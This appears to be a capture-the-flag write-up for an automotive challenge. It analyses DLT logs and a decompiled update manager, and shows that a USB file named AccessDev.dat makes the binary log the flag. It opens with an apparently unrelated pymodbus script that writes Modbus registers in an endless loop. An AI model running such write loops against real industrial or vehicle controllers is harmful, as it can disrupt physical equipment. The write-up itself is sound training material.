
```py
from pymodbus.client import ModbusTcpClient
import time

client = ModbusTcpClient('192.168.0.4')

if not client.connect():
    print("Failed to connect to Modbus server!")

print("Connected successfully!")

while True:
    reg_result = client.write_registers(1, [1, 1, 1])

client.close()
print("Connection closed.")
```

We are provided with 3 files, `updatemgr` `netstat.txt` and `cddc2025.dlt`.

**netstat.txt**

```
netstat -natlp | grep dlt | grep LISTEN
tcp        0      0 :::3490                 :::*                    LISTEN      249/dlt-daemon
```

This shows the `dlt-daemon` listening on port 3490.

> DLT refers to Diagnostic Log and Trace which is basically a common logging protocol used in automotives. [dlt-daemon](https://github.com/COVESA/dlt-daemon) would be the listening service in an automotive component that sends logging over the network.

`cddc2025.dlt` contains the logging messages that were captured at some point of time. If we run `strings` on the file, we can see lots of logging messages such as the following:

```
UPDM_wbIsFilePathExists() [Warn]file path does not exist. [/AccessDev.dat].
UPDM_wemReadFileData() [Err]failed to open file [/opt/ota/usrpwd.txt].
[16170.653955] TouchReport X(152)
[16170.653983] TouchReport Y(470)
[16170.653997] TouchReport Z(124)
```

Finally, the last piece of the puzzle is the `updatemgr` binary that seems to run on the automotive system and sends the logging data.

### Reverse-Engineering `updatemgr` binary

Doing a quick triage on the `updatemgr` binary, we can find that the flag will be printed when `wbIsFilePathExists(a1)` is called such that the file `a1` exists.

```c
int __fastcall UPDM_wbIsFilePathExists(const char *a1)
{
  char *n9; // r3
  unsigned __int8 fileExists; // [sp+Bh] [bp-645h] BYREF
  char s[172]; // [sp+Ch] [bp-644h] BYREF
  _BYTE v6[1432]; // [sp+B8h] [bp-598h] BYREF

  fileExists = 0;
  // truncated
  if ( !afw_fs_is_exist(a1, &fileExists) )
  {
    if ( fileExists )
    {
      afw_memset(s, 0, 170);
      snprintf(s, 0xAAu, "CDDC2025{_FLAG_HAS_BEEN_REMOVED_}\n", 196, "UPDM_wbIsFilePathExists", a1);
      if ( n9 == 9 || *(_BYTE *)n9 == 9 || afw_log_write_start(UPDATEMGR_LOG, v6, 2) <= 0 )
        return fileExists;
      goto LABEL_16;
    }
    afw_memset(s, 0, 170);
    snprintf(s, 0xAAu, "%04d %s() [Warn]file path does not exist. [%s].\n", 200, "UPDM_wbIsFilePathExists", a1);
    n9 = (char *)n9;
    if ( !n9 )
      return fileExists;
LABEL_14:
    if ( *n9 <= 1 || afw_log_write_start(UPDATEMGR_LOG, v6, 2) <= 0 )
      return fileExists;
LABEL_16:
    afw_log_write_string(v6, s);
    afw_log_write_finish(v6);
    return fileExists;
  }
  // truncated
  return 0;
}
```

From here, we can find cross-references of the function to identify how we can call this function with a file that exists.

In the `main` function, we can find that it sems to check if the file `AccessDav.dat` exists on connected USB devices.

```c
int UPDM_wvpOTAWoker_Main()
{
  // ... truncated ...
      if ( BasicAuth != 1 )
      {
        memset(idx, 0, sizeof(idx));
        memset(s_2, 0, sizeof(s_2));
        UPDM_wemGetMultiUsbRootPath((const char *)idx);
        afw_memset(s_2, 0, 256);
        snprintf(s_2, 0x100u, "%s/%s", (const char *)idx, "AccessDev.dat");
        if ( UPDM_wbIsFilePathExists(s_2)
          || (afw_memset(s_2, 0, 256),
              snprintf(s_2, 0x100u, "%s/%s", (const char *)&idx[32], "AccessDev.dat"),
              UPDM_wbIsFilePathExists(s_2)) )
  // ... truncated ...
}
```

The log messages also support our finding:  `UPDM_wbIsFilePathExists() [Warn]file path does not exist. [/AccessDev.dat]`.

### Solution

Essentially, we simply have to connect a USB device with the `AccessDev.dat` file and listen by running `dlt-receive -a <IP_ADDRESS_OF_AUTOMOTIVE_DEVICE>` to obtain the flag.
